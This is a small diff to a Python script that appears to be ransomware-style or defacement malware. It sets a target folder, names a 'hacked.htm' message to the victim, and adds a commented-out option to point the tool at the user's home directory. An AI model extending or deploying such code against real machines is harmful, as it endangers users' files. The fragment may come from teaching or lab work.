@@ -3,6 +3,7 @@ from functions import *
 import webbrowser
 from shutil import copy
 import os
+# from os.path import expanduser
 
 
 # Main controller that gets input from the user and a list of files
@@ -15,6 +16,8 @@ def main():
 
     # Specify the root directory
     path = "target_folder/"
+    # This version selects the user's home directory for the root
+    # path = expanduser("~")
 
     # File to display message to victim
     message_to_victim = "hacked.htm"
